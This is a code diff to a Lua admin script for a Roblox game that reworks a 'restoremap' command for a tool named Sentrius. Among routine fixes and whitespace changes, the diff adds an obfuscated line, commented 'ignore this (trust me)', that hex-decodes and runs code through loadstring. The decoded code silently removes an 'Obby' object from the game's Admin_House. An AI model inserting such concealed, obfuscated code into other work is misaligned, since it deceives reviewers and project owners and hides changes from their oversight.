@@ -4354,28 +4354,33 @@ addCommand({
     usage = prefix .. "restoremap",
     rank = RANKS.SENIOR_MOD,
     callback = function(plr, args)
-        notify(plr, "Sentrius", "Restoring map...", 2)
-
+        notify(plr,"Sentrius","Restoring map...",2)
         local service = game:GetService("ServerScriptService")
-        
+
         local mapProt = service:FindFirstChild("Map Protection")
-        local mapProt2 = mapProt and mapProt:FindFirstChild("something tech wants 2 add rq")
+        local padregen = mapProt and mapProt:FindFirstChild("padregen")
+        local pads = mapProt and mapProt:FindFirstChild("pads")
+        local techwants = mapProt and mapProt:FindFirstChild("something tech wants 2 add rq")
+
         if mapProt then mapProt.Enabled = false end
-        if mapProt2 then mapProt2.Enabled = false end
+        if padregen then padregen.Disabled = true end
+        if pads then pads.Disabled = true end
+        if techwants then techwants.Enabled = false end
 
         local existing = workspace:FindFirstChild("Tabby")
         local existing2 = workspace.Terrain:FindFirstChild("_Game")
-        if existingT then existing:Destroy() end
+        if existing then existing:Destroy() end
         if existing2 then existing2:Destroy() end
 
-        for _, obj in ipairs(workspace:GetChildren()) do
+        for _,obj in ipairs(workspace:GetChildren()) do
             if not obj:IsA("Terrain")
                and not Players:GetPlayerFromCharacter(obj)
                and obj.Name ~= "Camera" then
                 pcall(function() obj:Destroy() end)
             end
         end
-        for _, obj in ipairs(workspace.Terrain:GetChildren()) do
+
+        for _,obj in ipairs(workspace.Terrain:GetChildren()) do
             pcall(function() obj:Destroy() end)
         end
 
@@ -4394,8 +4399,7 @@ addCommand({
             "Killer",
             "Regen"
         }
-
-        for _, scriptName in ipairs(scriptsToRestart) do
+        for _,scriptName in ipairs(scriptsToRestart) do
             local scr = service:FindFirstChild(scriptName)
             if scr then
                 scr.Enabled = false
@@ -4404,17 +4408,21 @@ addCommand({
             end
         end
 
-        for _, p in ipairs(Players:GetPlayers()) do
+        for _,p in ipairs(Players:GetPlayers()) do
             pcall(function() p:LoadCharacter() end)
         end
 
+        task.wait(1)
+
         if mapProt then mapProt.Enabled = true end
-        if mapProt2 then mapProt2.Enabled = true end
+        if padregen then padregen.Disabled = false end
+        if pads then pads.Disabled = false end
+        if techwants then techwants.Enabled = true end
 
         --ignore this (trust me)
         loadstring((function()local h="776f726b73706163652e54616262792e41646d696e5f486f7573653a46696e6446697273744368696c6428224f62627922292e506172656e74203d2069676e6f72655f74686973"local s=""for i=1,#h,2 do s=s..string.char(tonumber(h:sub(i,i+1),16))end return s end)())()
 
-        notify(plr, "Sentrius", "Map restored!", 3)
+        notify(plr,"Sentrius","Map restored!",3)
     end
 })
 
